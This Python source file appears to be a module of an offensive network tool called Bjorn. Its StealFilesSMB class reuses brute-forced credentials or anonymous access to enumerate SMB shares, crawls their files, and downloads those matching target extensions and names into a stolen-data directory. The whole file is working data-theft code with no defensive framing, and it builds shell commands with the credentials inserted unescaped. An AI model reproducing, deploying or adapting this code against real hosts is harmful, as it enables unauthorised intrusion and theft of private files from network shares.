import os
import sys
import logging
import time
import subprocess

# Add vendored libs to path for pysmb
_libs_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'libs')
if _libs_path not in sys.path:
    sys.path.insert(0, _libs_path)

from smb.SMBConnection import SMBConnection
from smb.base import SharedFile
from shared import SharedData
from logger import Logger
from timeout_utils import TimeoutContext, run_with_timeout, subprocess_with_timeout

# Path to self-contained SMB2/3 binaries
_script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SMB2_CAT_BIN = os.path.join(_script_dir, 'bin', 'smb2-cat')
SMB2_SHARE_ENUM_BIN = os.path.join(_script_dir, 'bin', 'smb2-share-enum')

# Configure the logger
logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesSMB"
b_module = "steal_files_smb"
b_status = "steal_files_smb"
b_parent = "SMBBruteforce"
b_port = 445

IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$', 'Sharename', '---------', 'SMB1'}

class StealFilesSMB:
    """
    Class to handle the process of stealing files from SMB shares.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.smb_connected = False
            self.stop_execution = False
            self.b_parent_action = "brute_force_smb"  # Parent action status key
            logger.info("StealFilesSMB initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_smb(self, ip, username, password):
        """
        Establish an SMB connection with 30 second timeout.
        Uses pysmb (SMB1). For SMB2/3 servers, use smb2_* methods.
        """
        try:
            conn = SMBConnection(username, password, "Bjorn", "Target", use_ntlm_v2=True, is_direct_tcp=True)
            conn.connect(ip, 445, timeout=30)
            logger.debug(f"Connected to {ip} via pysmb as {username}")
            self.smb_connected = True
            return conn
        except Exception as e:
            logger.debug(f"pysmb connection failed for {ip} (may be SMB2/3 only): {e}")
            return None

    def smb2_list_shares(self, ip, username, password):
        """
        List shares using smb2-share-enum binary (SMB2/3).
        Returns list of share names or empty list on failure.
        """
        if not os.path.exists(SMB2_SHARE_ENUM_BIN):
            return []

        smb_url = f'smb://{username}:{password}@{ip}/'
        try:
            stdout, stderr, returncode = subprocess_with_timeout(
                f'{SMB2_SHARE_ENUM_BIN} "{smb_url}"', timeout=60
            )
            output = stdout.decode('utf-8', errors='ignore')
            if "Number of shares:" in output:
                shares = []
                for line in output.strip().splitlines():
                    line = line.strip()
                    if line and not line.startswith("Number of shares:"):
                        share_name = line.split()[0] if line.split() else line
                        if share_name and share_name not in IGNORED_SHARES:
                            shares.append(share_name)
                logger.debug(f"smb2-share-enum: {len(shares)} shares on {ip}")
                return shares
        except Exception as e:
            logger.debug(f"smb2-share-enum failed for {ip}: {e}")
        return []

    def smb2_download_file(self, ip, username, password, share, remote_path, local_path):
        """
        Download a file using smb2-cat binary (SMB2/3).
        Returns True on success, False on failure.
        """
        if not os.path.exists(SMB2_CAT_BIN):
            return False

        # smb2-cat URL format: smb://user:pass@host/share/path/to/file
        # Normalize the path (remove leading slash if present)
        clean_path = remote_path.lstrip('/').lstrip('\\')
        smb_url = f'smb://{username}:{password}@{ip}/{share}/{clean_path}'

        try:
            # Create local directory
            local_dir = os.path.dirname(local_path)
            os.makedirs(local_dir, exist_ok=True)

            # Run smb2-cat and redirect to file
            stdout, stderr, returncode = subprocess_with_timeout(
                f'{SMB2_CAT_BIN} "{smb_url}"', timeout=120
            )

            if returncode == 0 and stdout:
                with open(local_path, 'wb') as f:
                    f.write(stdout)
                logger.debug(f"Downloaded: {remote_path} (smb2-cat)")
                return True
            else:
                return False
        except Exception as e:
            return False

    def save_file_listing(self, ip, mac, share_name, files, protocol="smb"):
        """
        Save the complete file listing to a recon file for later analysis.
        """
        try:
            recon_dir = os.path.join(self.shared_data.datastolendir, "recon", "file_listings")
            os.makedirs(recon_dir, exist_ok=True)
            listing_file = os.path.join(recon_dir, f"{protocol}_{mac}_{ip}_{share_name}_files.txt")
            with open(listing_file, 'w') as f:
                f.write(f"# File listing for {ip} share '{share_name}' via {protocol.upper()}\n")
                f.write(f"# Total files discovered: {len(files)}\n")
                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("#" + "=" * 60 + "\n")
                for file in sorted(files):
                    f.write(f"{file}\n")
            logger.info(f"Saved file listing ({len(files)} files) to {listing_file}")
        except Exception as e:
            logger.error(f"Error saving file listing: {e}")

    def discover_all_files(self, conn, share_name, dir_path, all_files, depth=0, max_depth=3, max_files=500):
        """
        Recursively discover files in the SMB share.
        Limited to max_depth=3 and max_files=500 to prevent excessive scanning.
        """
        if depth > max_depth:
            return  # Silently stop at max depth to avoid log spam
        if self.stop_execution or self.shared_data.orchestrator_should_exit:
            return
        if len(all_files) >= max_files:
            return  # Stop if we've found enough files

        try:
            for file in conn.listPath(share_name, dir_path, timeout=15):
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    break
                if len(all_files) >= max_files:
                    break
                if file.isDirectory:
                    if file.filename not in ['.', '..']:
                        self.discover_all_files(conn, share_name, os.path.join(dir_path, file.filename), all_files, depth + 1, max_depth, max_files)
                else:
                    all_files.append(os.path.join(dir_path, file.filename))
        except Exception as e:
            # Only log at debug level to avoid log spam
            logger.debug(f"Cannot access {dir_path} in {share_name}: {e}")

    def find_files(self, conn, share_name, dir_path, ip=None, mac=None, depth=0, max_depth=3):
        """
        Find files in the SMB share based on the configuration criteria.
        Includes depth limit (default 3) and file limit (500) to prevent excessive scanning.
        Saves full file listing to recon.
        """
        # Discover files with limits
        all_files = []
        self.discover_all_files(conn, share_name, dir_path, all_files, depth, max_depth, max_files=500)

        # Save complete file listing for recon
        if ip and mac and all_files:
            self.save_file_listing(ip, mac, share_name, all_files, "smb")

        logger.info(f"Discovered {len(all_files)} files on {ip or 'target'} share '{share_name}' (max_depth={max_depth})")

        # Filter for matching files
        matching_files = []
        for file in all_files:
            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                break
            basename = os.path.basename(file)
            # Match by extension
            if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions):
                matching_files.append(file)
            # Match by name: path patterns (start with /) match end of path, others match basename
            elif any(file.endswith(fn) if fn.startswith('/') else fn == basename
                     for fn in self.shared_data.steal_file_names):
                matching_files.append(file)

        logger.info(f"Found {len(matching_files)} matching files to steal on share {share_name}")
        return matching_files

    def steal_file(self, conn, share_name, remote_file, local_dir):
        """
        Download a file from the SMB share to the local directory.
        """
        try:
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                conn.retrieveFile(share_name, remote_file, f)
            # Use debug level for individual files to reduce log spam
            logger.debug(f"Downloaded: {remote_file}")
        except Exception as e:
            logger.debug(f"Failed to download {remote_file}: {e}")

    def list_shares(self, conn):
        """
        List shares using the SMBConnection object.
        """
        try:
            shares = conn.listShares()
            valid_shares = [share for share in shares if share.name not in IGNORED_SHARES and not share.isSpecial and not share.isTemporary]
            logger.info(f"Found valid shares: {[share.name for share in valid_shares]}")
            return valid_shares
        except Exception as e:
            logger.error(f"Error listing shares: {e}")
            return []

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the SMB share.
        """
        start_time = time.time()
        logger.lifecycle_start("StealFilesSMB", ip, port)
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesSMB"
                logger.info(f"Stealing files from {ip}:{port}...")
                # Get SMB credentials from the cracked passwords file
                smbfile = self.shared_data.smbfile
                credentials = {}
                if os.path.exists(smbfile):
                    with open(smbfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            line = line.strip()
                            if not line:  # Skip empty lines
                                continue
                            parts = line.split(',')
                            if len(parts) >= 6 and parts[1] == ip:
                                share = parts[3]
                                user = parts[4]
                                password = parts[5]
                                if share not in credentials:
                                    credentials[share] = []
                                credentials[share].append((user, password))
                    logger.info(f"Found credentials for {len(credentials)} shares on {ip}")

                def try_anonymous_access():
                    """
                    Try to access SMB shares without credentials.
                    """
                    try:
                        conn = self.connect_smb(ip, '', '')
                        shares = self.list_shares(conn)
                        return conn, shares
                    except Exception as e:
                        logger.info(f"Anonymous access to {ip} failed: {e}")
                        return None, None

                if not credentials and not try_anonymous_access():
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def handle_timeout():
                    """
                    Timeout handler to stop the execution if no SMB connection is established.
                    """
                    if not self.smb_connected:
                        logger.lifecycle_timeout("StealFilesSMB", "SMB connection", 240, ip)
                        self.stop_execution = True

                # Use TimeoutContext instead of Timer(240)
                with TimeoutContext(timeout=240, on_timeout=handle_timeout) as timeout_ctx:
                    # Attempt anonymous access first
                    success = False
                    mac = row['MAC Address']
                    conn, shares = try_anonymous_access()
                    if conn and shares:
                        for share in shares:
                            if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                break
                            if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                                continue
                            remote_files = self.find_files(conn, share.name, '/', ip, mac)
                            local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share.name}")
                            if remote_files:
                                stolen_count = 0
                                for remote_file in remote_files:
                                    if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        break
                                    self.steal_file(conn, share.name, remote_file, local_dir)
                                    stolen_count += 1
                                success = True
                                logger.success(f"Stolen {stolen_count}/{len(remote_files)} files from {ip} share '{share.name}' (anonymous)")
                        conn.close()

                    # Track which shares have already been accessed anonymously
                    attempted_shares = {share.name for share in shares} if shares else set()

                    # Attempt to steal files using each credential for shares not accessed anonymously
                    # Try pysmb (SMB1) first, then fall back to smb2-cat (SMB2/3)
                    for share, creds in credentials.items():
                        if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                            break
                        if share in attempted_shares or share in IGNORED_SHARES:
                            continue
                        for username, password in creds:
                            if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                break
                            try:
                                logger.debug(f"Trying {username} for share {share}")
                                conn = self.connect_smb(ip, username, password)
                                if conn:
                                    # pysmb (SMB1) connection successful
                                    remote_files = self.find_files(conn, share, '/', ip, mac)
                                    local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share}")
                                    if remote_files:
                                        stolen_count = 0
                                        for remote_file in remote_files:
                                            if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                                break
                                            self.steal_file(conn, share, remote_file, local_dir)
                                            stolen_count += 1
                                        success = True
                                        logger.success(f"Stolen {stolen_count}/{len(remote_files)} files from {ip} share '{share}'")
                                    conn.close()
                                    if success:
                                        break  # Exit the loop as we have found valid credentials
                                else:
                                    # pysmb failed, try SMB2/3 with smb2-cat
                                    logger.debug(f"Falling back to smb2-cat for {share}")
                                    # We can't list files with smb2-cat, so try known file patterns
                                    mac = row['MAC Address']
                                    local_dir = os.path.join(self.shared_data.datastolendir, f"smb/{mac}_{ip}/{share}")
                                    # Try to download files matching steal patterns from root
                                    for ext in self.shared_data.steal_file_extensions:
                                        for filename in self.shared_data.steal_file_names:
                                            if timeout_ctx.should_stop or self.stop_execution or self.shared_data.orchestrator_should_exit:
                                                break
                                            test_file = filename + ext if not filename.endswith(ext) else filename
                                            local_path = os.path.join(local_dir, test_file)
                                            if self.smb2_download_file(ip, username, password, share, test_file, local_path):
                                                success = True
                                    if success:
                                        logger.success(f"Stolen files from {ip} share '{share}' (smb2-cat)")
                                        break
                            except Exception as e:
                                logger.error(f"Error stealing files from {ip} on share '{share}' with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    status = 'failed'
                else:
                    status = 'success'
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesSMB", status, duration, ip)
                return status
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                duration = time.time() - start_time
                logger.lifecycle_end("StealFilesSMB", 'skipped', duration, ip)
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            duration = time.time() - start_time
            logger.lifecycle_end("StealFilesSMB", 'failed', duration, ip)
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_smb = StealFilesSMB(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
